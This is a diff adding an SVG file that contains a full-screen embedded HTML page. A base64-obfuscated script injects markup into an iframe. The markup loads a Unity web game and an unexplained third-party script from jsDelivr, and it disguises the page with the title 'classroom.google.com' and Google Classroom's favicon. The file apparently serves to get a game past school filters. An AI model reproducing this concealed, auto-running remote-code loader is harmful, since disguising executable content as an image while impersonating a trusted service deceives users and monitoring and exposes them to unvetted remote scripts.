@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
+<style>[...]</style>
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+    <meta content='width=device-width, initial-scale=1.0' name='viewport'></meta>
+	 <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+         <script>let l = atob("PGJhc2UgaHJlZj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvaHlwZXJ3b29kL3R1cm5AMDA0ZDg1MmM2MjFlY2M0ZmJkOTlhMGJjYmU2ZDEwMzc3ZTM0Y2RkMC9saWIvID48bGluayBocmVmPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9lcmE2eWVyYTZ5LzAwQDZkNDM2MThhZmRlZmZhYzNkYzM3NTJiZDQyNjE5NjU2ZTAyMmM4N2YvVGVtcGxhdGVEYXRhL3N0eWxlLmNzcyByZWw9c3R5bGVzaGVldD48c2NyaXB0IHNyYz1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvZXJhNnllcmE2eS8wMEA2ZDQzNjE4YWZkZWZmYWMzZGMzNzUyYmQ0MjYxOTY1NmUwMjJjODdmL1RlbXBsYXRlRGF0YS9Vbml0eVByb2dyZXNzLmpzPjwvc2NyaXB0PjxzY3JpcHQgc3JjPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9lcmE2eWVyYTZ5LzAwQDZkNDM2MThhZmRlZmZhYzNkYzM3NTJiZDQyNjE5NjU2ZTAyMmM4N2YvQnVpbGQvVW5pdHlMb2FkZXIuanM+PC9zY3JpcHQ+PHNjcmlwdD52YXIgZ2FtZUluc3RhbmNlPVVuaXR5TG9hZGVyLmluc3RhbnRpYXRlKCJnYW1lQ29udGFpbmVyIiwiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2h5cGVyd29vZC90dXJuQDM4N2YyYTYyZWUwZWQyNzY2OWMyNzZiYWEwMzQ5NzhlNjhhYmU0NGEvbGliL3NyLmpzb24iLHtvblByb2dyZXNzOlVuaXR5UHJvZ3Jlc3MsTW9kdWxlOntvblJ1bnRpbWVJbml0aWFsaXplZDpmdW5jdGlvbigpe1VuaXR5UHJvZ3Jlc3MoZ2FtZUluc3RhbmNlLCJjb21wbGV0ZSIpfX19KTwvc2NyaXB0PjxzY3JpcHQgc3JjPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9zdDM5L3Nka0BtYWluL2FwaS5qcz48L3NjcmlwdD48dGl0bGU+Y2xhc3Nyb29tLmdvb2dsZS5jb208L3RpdGxlPjxsaW5rIGhyZWY9aHR0cHM6Ly9zc2wuZ3N0YXRpYy5jb20vY2xhc3Nyb29tL2Zhdmljb24ucG5nIHJlbD1pY29uPjxkaXYgY2xhc3M9d2ViZ2wtY29udGVudD48ZGl2IGlkPWdhbWVDb250YWluZXIgc3R5bGU9d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTttYXJnaW46YXV0bz48L2Rpdj48L2Rpdj4="); var theIframe = document.getElementById('test'); theIframe.srcdoc = l;</script>
+    </body>
+  </foreignObject>
+      <script><![CDATA[...]]></script>
+</svg>
